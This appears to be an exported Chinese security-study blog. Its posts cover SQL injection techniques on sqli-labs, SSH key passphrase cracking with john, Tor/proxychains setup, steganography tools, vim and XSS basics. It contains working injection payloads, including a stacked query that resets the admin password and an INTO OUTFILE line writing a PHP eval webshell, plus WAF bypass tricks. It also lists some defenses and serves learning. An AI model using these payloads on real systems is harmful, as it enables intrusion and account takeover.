<p>当使用Addslashes函数防止sql注入时,将传入参数值进行转义.当输入<code>&#39;</code>时,那么就会被自动转义成<code>\&#39;</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200511_180818.jpg" alt="addslashes"></p>
<p>结合前面所说的URL编码都是16进制的ASCII码,%5c对应ASCII码的<code>\</code>,我们所要考虑的就是将<code>\</code>转义掉,让我们的单引号逃逸.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200511_213319.jpg" alt="man"></p>
<p>两个十六进制位则占一个字节,GBK编码遇到连续的两个字节则会解释成汉字,所以如果我们输入一个大于128的十六进制位那么<code>%df</code>就会被转义的单引号<code>\&#39;</code>的<code>\</code>进行结合被解释成一个汉字,从而造成单引号逃逸<br><img src="https://images.atsud0.me/images/post/Screenshot_20200511_212409.jpg" alt="sddd"></p>
<p>为什么要大于128?因为ascii已经占用了128个标准的字符了,所以要大于128.(十进制大于128),所以不管是<code>%df</code>还是<code>%cf</code> 只要这个的十六进制值换算后的十进制值大于128那么就能组合成汉字</p>
<p>使用<code>mysqli_real_escape_string</code>转义用户输入的内容时,要预先设置好数据库编码方式,如果不设置,那么这个函数就不会很好的发挥它的效果.</p>
<h2 id="宽字节注入防御方式"><a href="#宽字节注入防御方式" class="headerlink" title="宽字节注入防御方式"></a>宽字节注入防御方式</h2><ol>
<li>魔术引号(5.2后版本舍弃)</li>
<li>mysql_set_charset(‘GBK’)#根据数据库编码设置    <ol>
<li>mysqli_real_escape_string 转义用户输入</li>
</ol>
</li>
<li>使用addslashes()函数</li>
<li>正则匹配后替换</li>
</ol>
<h1 id="二次解码注入"><a href="#二次解码注入" class="headerlink" title="二次解码注入"></a>二次解码注入</h1><p>因为URL编码只在后端进行一次解码,造成了引号逃逸</p>
<p>原理:<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_095459.jpg" alt="twice"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200512_101723.jpg" alt="1"></p>
<p>%2527</p>
<h1 id="二次注入-存储型注入"><a href="#二次注入-存储型注入" class="headerlink" title="二次注入(存储型注入)"></a>二次注入(存储型注入)</h1><p>攻击者构造的恶意数据被存储在数据库后,恶意数据被存入数据库,但是数据库只会存储没有功能性的字符.<br>取并进入到sql查询语句所导致的注入.</p>
<p>原理<img src="https://images.atsud0.me/images/post/Screenshot_20200513_092916.jpg" alt="double"></p>
<p>如<code>sqli-less24</code>靶场,默认是一个登录界面,如何进行二次注入.<br>先尝试注册一个用户名,测试<code>admin&#39;#&#39;&#39;</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211423.jpg" alt="aa"></p>
<p>修改密码,当前密码可以不用输入.可以看到已经修改成功了,以为着admin的密码已经被修改了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211530.jpg" alt="ww"></p>
<p>成功登录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211653.jpg" alt="a"></p>
<p>为什么呢,我们可以查看源代码,<code>pass_change.php</code>观察红线所划出的两行<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211835.jpg" alt=""></p>
<p>其中第一行<code>$username=($_SESSION[&quot;username&quot;]);</code>没有对用户名进行转义,而我们用户名为<code>admin&#39;#&#39;&#39;</code>而<code>#</code>在sql语句中是注释的意思,所以如果没有对<code>$username</code>进行转义的话,那么我们的数据库在后端操作红线划出的第二行的sql执行语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure>
<p>会在数据库被解释为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update users set password&#x3D;&#39;a&#39; where username&#x3D;&#39;admin&#39;#&#39;&#39;&#39; and password&#x3D;&#39;&#39;....</span><br></pre></td></tr></table></figure>
<p>在<code>#</code>号后面的已经无关紧要了,因为后面的语句已经被注释掉了.所以这一段sql语句会被执行成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update users set password&#x3D;&#39;a&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>


<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>核心思想:同时执行多条语句,mysql语句<code>;</code>号结尾</p>
<ul>
<li>局限1:API限制</li>
<li>局限2:数据库引擎</li>
<li>局限3:权限不足</li>
</ul>
<p>以<code>sqli-less38</code>靶场为例</p>
<p>先判断闭合等方式就不说了,当确认可以注入之后就可以了,执行我们的修改语句重点在于每一句的语句之后都要分号结尾,否则不成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3;update users set password&#x3D;&#39;b&#39; where username&#x3D;&#39;admin&#39;; #</span><br></pre></td></tr></table></figure>

<p><code>sqli-less39</code>关同理,只是闭合方式不一样</p>
<h1 id="DNS-log注入"><a href="#DNS-log注入" class="headerlink" title="DNS log注入"></a>DNS log注入</h1><h1 id="基于http头部的SQL注入"><a href="#基于http头部的SQL注入" class="headerlink" title="基于http头部的SQL注入"></a>基于http头部的SQL注入</h1><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>使用burpsuite抓包,修改cookie值,要注意闭合</p>
<h2 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h2><p>使用burpsuite抓包,修改referer值,要注意闭合</p>
<h2 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h2><p>使用burpsuite抓包,修改user-agent值,要注意闭合</p>
<h1 id="Mysql文件读写"><a href="#Mysql文件读写" class="headerlink" title="Mysql文件读写"></a>Mysql文件读写</h1><blockquote>
<p>在数据库用户权限足够,并且开启了特定配置的时候,我们可以尝试利用这个来对文件进行读(获取目标机器上的部分信息)写(直接拿shell)</p>
</blockquote>
<h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>用于写一句话</p>
<p>要求配置:</p>
<ul>
<li><code>secure_file_priv</code> 限制用户读写文件的选项</li>
</ul>
<p>查看当前值设置</p>
<p><code>show variables like &#39;%secure_file%&#39;</code></p>
<ul>
<li>为空时 没有限制</li>
<li>一个目录时:只能在那个目录中导入导出(这个目录必须存在)</li>
<li>为NULL 禁止导入导出</li>
</ul>
<p><code>max_allowed_packet</code> 限制接收数据包的大小</p>
<p>临时设置:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global max_allowed_packet 1024*1024*1024</span><br></pre></td></tr></table></figure>
<p>永久修改:</p>
<pre><code>修改my.ini</code></pre><p>sqli-less-7<br><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[a])?&gt;&#39; into outfile &quot;绝对路径&quot; --+</code> <strong>注意闭合</strong></p>
<p>这个路径可以不在网站根目录下(看具体设置,最好不要写在C盘,因为要额外设置权限,但是一般都不会给mysqlC盘其他位置的写入权限把…)</p>
<h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p><code>load_file(file_name)</code><br>读取文件并返回该文件的内容作为一个字符串</p>
<p>使用条件:</p>
<ul>
<li>A:有权限读取并且完全可读</li>
<li>B:读取文件必须在服务器上</li>
<li>C:必须指定文件的绝对路径</li>
<li>D:读取文件大小必须小于<code>max_allowed_packet</code></li>
</ul>
<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>实际上没什么机会能用到的</p>
<p>username:<code>&#39; or 1=1 --</code><br>password:<code>&#39; or 1=1 --</code></p>
<h1 id="死活爆破不出列名，只知道表名，要怎么进行注入"><a href="#死活爆破不出列名，只知道表名，要怎么进行注入" class="headerlink" title="死活爆破不出列名，只知道表名，要怎么进行注入?"></a>死活爆破不出列名，只知道表名，要怎么进行注入?</h1><p>偏移注入（待填坑</p>
<h1 id="额外知识"><a href="#额外知识" class="headerlink" title="额外知识"></a>额外知识</h1><h2 id="sql注入几种绕过"><a href="#sql注入几种绕过" class="headerlink" title="sql注入几种绕过"></a>sql注入几种绕过</h2><ol>
<li><p>当屏蔽group_concat时,用<code>concat(table_name)</code> 或者直接就<code>table_name</code>，然后使用<code>limit</code>获取我们需要的信息</p>
</li>
<li><p>当输出时,观察后面部分,在我们构造的order by之后还有一个order by,我们应该把它注释掉<br><img src="https://images.atsud0.me/images/post/Screenshot_20200510_143304.jpg" alt="sd"></p>
</li>
</ol>
<p>正确的方式:<code>http://111/english/gallery.php?cid=1%20order%20by%2015%20--+</code></p>
<h2 id="过WAF"><a href="#过WAF" class="headerlink" title="过WAF"></a>过WAF</h2><p>先尝试关键词会不会被截断,要用好内联注释</p>
<p>双写<br>大小写 uNIon Select<br>使用编码 ‰55nion %53elect 1,2,3,4<br>使用注释<br>特殊符号</p>
<h2 id="注释方式"><a href="#注释方式" class="headerlink" title="注释方式"></a>注释方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">-- 注意后面有空格</span><br><span class="line">&#x2F;* *&#x2F;</span><br><span class="line">&#x2F;*! *&#x2F;注释完整的单词,不能注释部分的单词,绕过一些过滤(不是注释的注释)(不能真的算是注释,但是能用于过waf)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在mysql中 <code>/*! ....*/</code> 不是注释，<code>mysql</code>为了保持兼容，它把一些特有的仅在<code>mysql</code>上用的语句放在/<code>*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在<code>mysql</code>中它会执行。</p>
</blockquote>
<h2 id="引号闭合"><a href="#引号闭合" class="headerlink" title="引号闭合"></a>引号闭合</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单引号中插入双引号不会报错,不影响执行,但是数字型和双引号中插入双引号会报错...</span><br><span class="line"></span><br><span class="line">双引号中插入单引号不会报错,不影响执行,但是数字型和单引号中插入单引号会报错...</span><br></pre></td></tr></table></figure>


<h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">or 1&#x3D;1</span><br><span class="line">xor 1&#x3D;2</span><br><span class="line">like 1</span><br></pre></td></tr></table></figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">魔术引号</span><br><span class="line">过滤函数（严格过滤用户的输入</span><br><span class="line">WAF</span><br><span class="line">PDO预处理</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>sql_injection</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh_id_rsa密码破解</title>
    <url>/2020/04/17/ssh-id-rsa%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">ssh2john下载地址</a></p>
<p>使用<code>ssh2john</code>解密出私钥密码的hash值.<br>格式<br><code>python ssh2john [hash_file]</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_193756.jpg" alt="ssh2john_1"><br>使用他这段哈希值用john爆破.</p>
<p>john –wordlist=[wordlist_file] [hash_file]</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_194150.jpg" alt="john"></p>
<p>使用<code>john</code>时要注意不要直接使用<code>/usr/share/wordlists/rockyou.txt.gz</code>，要解压出来成<code>rockyou.txt</code>文件才能使用，否则会报错</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200427_214142.jpg" alt="error!"></p>
<p>百思不得其解的报错，后来才发现不允许直接使用<code>rockyou.txt.gz</code></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>john</tag>
      </tags>
  </entry>
  <entry>
    <title>tor笔记</title>
    <url>/2020/05/16/tor%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>本文主要是</p>
<ul>
<li>下载安装配置tor</li>
<li>配置proxychains<br>大佬请轻喷</li>
</ul>
<footer><strong>atsud0</strong></footer></blockquote>

<p>学习高匿请前往:</p>
<ul>
<li><a href="https://program-think.blogspot.com/" target="_blank" rel="noopener">编程随想</a></li>
</ul>
<p>了解tor请前往:</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/Tor" target="_blank" rel="noopener">tor-wiki</a></li>
<li><a href="https://zh.wikipedia.org/wiki/SOCKS" target="_blank" rel="noopener">socks</a></li>
</ul>
<a id="more"></a>

<h1 id="tor网络"><a href="#tor网络" class="headerlink" title="tor网络"></a>tor网络</h1><p>Tor(The Onion Router)是一个免费,开源,实现匿名通信的软件.</p>
<blockquote><p>用戶可透過Tor接達由全球志願者免費提供，包含7000+個中繼的覆盖网络，從而達至隱藏用戶真實地址、避免網絡監控及流量分析的目的。Tor用戶的互聯網活動（包括瀏覽在線網站、帖子以及即時消息等通訊形式）相對較難追踪。Tor的設計原意在於保障用戶的個人私隱，以及不受監控地進行秘密通信的自由和能力。 </p>
<footer><strong>tor-wiki</strong><cite><a href="https://zh.wikipedia.org/wiki/Tor" target="_blank" rel="noopener">zh.wikipedia.org/wiki/Tor</a></cite></footer></blockquote>



<p>Tor工作在应用层</p>
<p>当发送数据包时:</p>
<blockquote>
<p>Tor会对<strong>数据</strong>和<strong>下一跳的IP</strong>进行多次加密,通过随机选择的Tor节点送出.</p>
</blockquote>
<p>当返回数据包:</p>
<blockquote>
<p>Tor中继都会对一层加密进行解密(IP),以便知道数据中下一个IP的目的地.然后将剩余的加密数据继续传给下一个节点,但是只有最后的中继节点会解密最内层的加密数据,在不会泄露或得知源IP的情况下,将原始数据传送回给原始地址</p>
</blockquote>
<p><strong>但是tor网络并不是绝对安全的.</strong></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install tor</span><br><span class="line">sudo pacman -S tor</span><br><span class="line">管理服务启动</span><br><span class="line">systemctl start&#x2F;stop&#x2F;status tor</span><br><span class="line">自启</span><br><span class="line">systemctl enable tor</span><br></pre></td></tr></table></figure>

<p><a href="https://2019.www.torproject.org/docs/tor-manual.html" target="_blank" rel="noopener">tor官方帮助手册</a></p>
<p>在朝鲜和某些国家,tor网桥可能会受到屏蔽,影响使用,强烈建议使用前置代理.</p>
<p>tor配置,添加前置代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;tor&#x2F;torrc</span><br><span class="line"></span><br><span class="line">Socks5Proxy 127.0.0.1:1080 #这里是你代理服务器的ip地址和端口</span><br></pre></td></tr></table></figure>
<p>重启服务即可</p>
<h2 id="验证是否开启tor"><a href="#验证是否开启tor" class="headerlink" title="验证是否开启tor"></a>验证是否开启tor</h2><p>tor默认9050端口</p>
<p>获取ip的方式确定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --socks5 localhost:9050 cip.cc</span><br></pre></td></tr></table></figure>

<p>或者访问<a href="https://check.torproject.org/" target="_blank" rel="noopener">tor-projet-check-tor</a></p>
<p>如果看到以下画面就是成功了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200515_214524.jpg" alt="success"></p>
<h1 id="SOCKS5"><a href="#SOCKS5" class="headerlink" title="SOCKS5"></a>SOCKS5</h1><p>SOCKS协议工作在</p>
<ul>
<li>OSI模型会话层</li>
</ul>
<p>socks代理</p>
<ul>
<li>socks不加密</li>
<li>socks5可转发UDP流量</li>
<li>默认端口一般为1080</li>
<li>不关心用户的请求协议,只传递数据包</li>
<li>支持各种身份验证,服务器端域名解析等</li>
</ul>
<p>命令行代理链</p>
<h2 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S proxychain</span><br></pre></td></tr></table></figure>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>

<p>代理链区别</p>
<ul>
<li>dynamic_chain 动态代理链<ul>
<li>动态代理链将按照列表中的代理服务器的先后顺序组成一条链,如果有其中一台代理服务器出现故障,将会自动排除</li>
</ul>
</li>
<li>strict_chain 静态代理链<ul>
<li>静态代理链将按照列表中的代理服务器的先后顺序组成一条链,如果其中有一台代理服务器出现故障,不会自动排除,所以就静态代理链要求所有代理服务器都处于可用状态 </li>
</ul>
</li>
<li>rondom_chain 随机代理链<ul>
<li>随机选择列表中的一个代理服务器进行使用</li>
</ul>
</li>
</ul>
<p>注销掉这行内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxy_dns</span><br></pre></td></tr></table></figure>
<p>取消注释proxy_dns很有用，以防止DNS泄漏真实ip。</p>
<p>在最下放的列表添加自己的代理服务器后,即可使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socks4 127.0.0.1 9050 #tor</span><br><span class="line">socks5 127.0.0.1 1080 #socks5代理</span><br></pre></td></tr></table></figure>


<h1 id="tor浏览器"><a href="#tor浏览器" class="headerlink" title="tor浏览器"></a>tor浏览器</h1><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S tor-browser</span><br></pre></td></tr></table></figure>

<p>官方下载地址<a href="https://www.torproject.org/download/" target="_blank" rel="noopener">tor-project</a></p>
<p>最好还是在官方下载.</p>
<p>tor浏览器配置很简单,前面已经说过了,tor网桥在朝鲜和少数其他国家被ban了,所以使用前置代理的方式能让你体验更加友好.<br><a href="https://images.atsud0.me/images/post/Screenshot_20200516_132925.jpg" target="_blank" rel="noopener">tor</a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tor</tag>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>steganography学习</title>
    <url>/2020/05/11/steganography%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>学习图片隐写术和音频分析的相关工具</p>
<p>在线链接:<a href="https://tryhackme.com/room/ccstego" target="_blank" rel="noopener">CC:Steganography</a></p>
<a id="more"></a>

<h1 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h1><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S binwalk</span><br></pre></td></tr></table></figure>

<p>自动检测提取内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e flag1.jpeg</span><br></pre></td></tr></table></figure>

<p>提取所有内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk --dd&#x3D;&quot;.*&quot; flag1.jpeg</span><br></pre></td></tr></table></figure>


<h2 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install steghide</span><br><span class="line">sudo pacman -S steghide</span><br></pre></td></tr></table></figure>

<p>部分参数<br>|参数|功能|<br>|–|–|<br>|embed|写数据<br>|-ef|写数据到一个文件<br>|-cf|设置封面<br>|-p|设置密码<br>|extract|解压数据<br>|-sf|从一个加密的文件里面读数据</p>
<p>从一张有密码的文件里面取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf exam1.jpeg</span><br><span class="line">Enter passphrase:</span><br><span class="line">the file &quot;a.txt&quot; does already exist. overwrite ? (y&#x2F;n) y</span><br><span class="line">wrote extracted data to &quot;a.txt&quot;.</span><br></pre></td></tr></table></figure>
<p>如果无密码则直接回车</p>
<h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains gem install zsteg #不挂代理网速很慢..</span><br><span class="line">将ruby的bin加入到环境变量</span><br><span class="line">PATH&#x3D;&quot;$PATH:&#x2F;home&#x2F;user&#x2F;.gem&#x2F;ruby&#x2F;2.7.0&#x2F;bin&quot; #临时</span><br></pre></td></tr></table></figure>

<p>部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>–lsb</td>
<td>从最低位开始</td>
</tr>
<tr>
<td>–msb</td>
<td>从最高位开始</td>
</tr>
<tr>
<td>-v</td>
<td>详细信息</td>
</tr>
<tr>
<td>-E</td>
<td>从特定负载里提取数据</td>
</tr>
</tbody></table>
<p>用法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg 1.png</span><br></pre></td></tr></table></figure>

<h2 id="Exiftool"><a href="#Exiftool" class="headerlink" title="Exiftool"></a>Exiftool</h2><p>获取图片元数据</p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S exiftool</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ exiftool jpeg1.jpeg</span><br></pre></td></tr></table></figure>

<h2 id="Stegoveritas"><a href="#Stegoveritas" class="headerlink" title="Stegoveritas"></a>Stegoveritas</h2><p>stegoveritas基本支持所有格式的图片</p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install stegoveritas </span><br><span class="line"></span><br><span class="line">stegoveritas_install_deps</span><br></pre></td></tr></table></figure>

<p>部分参数<br>|参数|功能<br>|–|–|<br>|-meta|元数据<br>|-steghide|提取隐藏数据<br>|-extractLSB|提取LSB数据</p>
<p>用法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stegoveritas jpeg2.jpg</span><br></pre></td></tr></table></figure>

<h2 id="hexdump-winhex"><a href="#hexdump-winhex" class="headerlink" title="hexdump winhex"></a>hexdump winhex</h2><p>查看文件的十六进制视图</p>
<p>查看两个图片的十六进制差异</p>
<p>diff -a a.jpg b.jpg|hexdump -C </p>
<h2 id="StegCracker"><a href="#StegCracker" class="headerlink" title="StegCracker"></a>StegCracker</h2><p>暴力破解隐藏图片的密码</p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S stegcracker</span><br></pre></td></tr></table></figure>

<p>用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stegcracker &lt;file&gt; [&lt;wordlist&gt;]</span><br></pre></td></tr></table></figure>

<h1 id="音频分析"><a href="#音频分析" class="headerlink" title="音频分析"></a>音频分析</h1><h2 id="Spectrogram"><a href="#Spectrogram" class="headerlink" title="Spectrogram"></a>Spectrogram</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S sonic-visualiser</span><br></pre></td></tr></table></figure>

<p>打开一个音频文件后应该会看到类似的图片<br><img src="https://images.atsud0.me/images/post/8TexIob.png" alt="file"></p>
<p>点击工具栏的<code>Layer</code>-&gt;<code>Add Spectrogram</code>,接着应该会看到类似的图片</p>
<p><img src="https://images.atsud0.me/images/post/wHSr0NM.png" alt="file-a"></p>
<p>可以拖动右下方的滑轮之类的东西,能放大和移动到指定的位置.</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>steganography</tag>
      </tags>
  </entry>
  <entry>
    <title>vim基本命令</title>
    <url>/2020/05/07/vim%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一些我记不住vim的基本命令.<br>本文不适合纯小白.如果要学习使用vim建议去以下网站</p>
<p><a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">runoob</a><br><a href="https://coolshell.cn/articles/5426.html" target="_blank" rel="noopener">coolshell</a><br><a href="https://github.com/wsdjeg/vim-galore-zh_cn" target="_blank" rel="noopener">galore</a></p>
<a id="more"></a>

<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>vi 分为三种模式</p>
<ul>
<li>一般模式</li>
<li>输入模式</li>
<li>底线命令模式(行尾模式)</li>
</ul>
<p>vim 分为四种模式</p>
<ul>
<li>一般模式</li>
<li>输入模式</li>
<li>命令模式(vi的行尾模式)</li>
<li>可视模式</li>
</ul>
<p>上下左右</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   k</span><br><span class="line">h     l</span><br><span class="line">   j</span><br></pre></td></tr></table></figure>

<p><code>I</code> 在行首开始写</p>
<p><code>i</code> 在当前光标位置前开始写</p>
<p><code>a</code> 在当前光标位置后开始写</p>
<p><code>A</code> 在行尾开始写</p>
<p><code>o</code> 在当前行的下一行写</p>
<p><code>O</code> 在当前行的上一行写</p>
<h1 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h1><p><code>:w !sudo tee ^</code> 作为root用户保存(这在打算修改好一个配置文件后,在保存的时候却发现没有权限</p>
<p><code>wqa</code>保存并退出所有标签</p>
<h1 id="复制剪切"><a href="#复制剪切" class="headerlink" title="复制剪切"></a>复制剪切</h1><p><code>y$</code> 从当前光标复制到行尾</p>
<p><code>D</code> 删除到行尾</p>
<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><code>/</code>向前搜索<br><code>?</code>向后搜索<br><code>n</code>下一个匹配的单词<br><code>N</code>上一个匹配的单词<br><code>:vimgrep</code> 在vim中使用grep搜索多个文件</p>
<h1 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h1><p><code>:%s/old/new/g</code> 替换old字符串为new 全局<br><code>:s/old/new/</code> 替换当前行第一个 old 为 new<br><code>:s/old/new/g</code> 替换当前行所有 vivian 为 sky</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>xss笔记</title>
    <url>/2020/05/24/xss%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>有关XSS的笔记。</p>
<a id="more"></a>

<h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>XSS又称Cross-site scripting(跨站脚本攻击。它是一种注入类型，可以使攻击者执行恶意脚本并使其在受害者计算机上执行。如果Web应用程序未经过滤的使用用户的输入那么就很容易受到XSS的攻击。XSS可以在Javascript，VBScript，Flash和CSS中使用。XSS分为两类。</p>
<ul>
<li>存储型（持久型</li>
<li>反射型（非持久型</li>
</ul>
<p>三种类型的区别<br><img src="https://images.atsud0.me/images/post/Screenshot_20200518_151513.jpg" alt=""></p>
<p>XSS攻击的是客户端。漏洞特点在于：服务端<strong>原封不动返回数据</strong>，在客户端执行，这个特点作为探测的参考<br>基本探测语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(1)&lt;&#x2F;scirpt&gt;警告框</span><br><span class="line">&lt;scirpt&gt;prompt(1)&lt;&#x2F;scirpt&gt;提示框</span><br><span class="line">&lt;scirpt&gt;confirm(1)&lt;&#x2F;scirpt&gt;确认框</span><br></pre></td></tr></table></figure>
<p>html注入代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;www.baidu.com&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>漏洞危害:</p>
<ul>
<li>Cookie盗取</li>
<li>键盘记录</li>
<li>摄像头拍照</li>
<li>钓鱼</li>
<li>端口扫描</li>
<li>网站重定向</li>
<li>后台增删改文章</li>
<li>获取用户信息（浏览器信息，ip地址</li>
<li>更多…</li>
</ul>
<h3 id="xss漏洞流程"><a href="#xss漏洞流程" class="headerlink" title="xss漏洞流程"></a>xss漏洞流程</h3><ol>
<li>对用户提交的数据过滤不严格</li>
<li>提交给服务器的脚本被原封不动的返回给客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ol>
<p>攻击者构造一个恶意链接发给受害者，恶意代码没有保存在目标网站，而web应用程序原封不动的把恶意脚本返回给受害者的浏览器，受害者的浏览器就会本地解析恶意代码，从而达成攻击效果</p>
